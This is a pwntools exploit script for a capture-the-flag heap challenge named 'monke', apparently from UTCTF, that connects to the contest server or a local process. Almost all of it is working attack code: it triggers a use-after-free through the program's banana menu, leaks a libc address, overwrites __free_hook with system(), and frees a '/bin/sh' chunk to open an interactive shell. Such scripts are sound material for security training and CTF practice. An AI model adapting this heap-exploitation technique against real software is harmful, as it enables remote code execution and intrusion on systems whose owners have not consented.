#!/usr/bin/python3

from pwn import *

exe = ELF('monke', checksec=False)
ld = ELF('ld-2.27.so', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)

context.binary = exe
context.terminal = 'tmux split -h'.split(' ')
context.arch = 'amd64'
# context.log_level = 'debug'

if args.REMOTE:
    p = remote('pwn.utctf.live', 9999)
else:
    p = process([ld.path, exe.path], env={'LD_PRELOAD': libc.path})
    if args.GDB:
        gdb.attach(p, '''
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'to do?\n', str(choice).encode())

def walk(direction):
    choose(0)
    p.sendlineafter(b'w]\n', direction)

def sleep():
    choose(1)

def inventory(index, action=False, new_name=False):
    choose(2)
    if action:
        p.sendlineafter(b'item.\n', str(index).encode())
        p.sendlineafter(b'rename]:\n', action)
        if action == b'rename':
           p.sendlineafter(b'it:\n', new_name) 
    else:
        p.recvuntil(b'item.\n' + str(index).encode() + b': ')
        leak = u64(p.recv(6).ljust(8, b'\x00'))
        p.sendline(b'200')
        return leak
        

def take_banana(length, name):
    choose(3)
    p.sendlineafter(b'be:\n', str(length).encode())
    p.sendlineafter(b'it:\n', name)

def avoid_eating():
    walk('z')

def find_banana():
    while True:
        walk('n')
        feedback = p.recvline()
        if b'banana' in feedback:
            break

# 1. Setup conditions for UAF

avoid_eating()
find_banana()

# 2. Leak libc address

take_banana(0x500, b'A' * 0x10)                 # 0
take_banana(0x30, b'B' * 0x10)                  # 1

inventory(0, b'eat')
libc_leak = inventory(0)
libc.address = libc_leak - 0x3ebca0

log.info(f'libc_leak = {hex(libc_leak)}')
log.info(f'libc @ {hex(libc.address)}')

# 3. Overwrite __free_hook with system address

log.info(f'__free_hook @ {hex(libc.sym.__free_hook)}')
log.info(f'system @ {hex(libc.sym.system)}')

inventory(1, b'eat')
inventory(1, b'rename', p64(libc.sym.__free_hook))

take_banana(0x30, b'/bin/sh')                   # 2
take_banana(0x30, p64(libc.sym.system))         # 3

# 4. Spawn a shell

inventory(2, b'eat')

p.interactive()
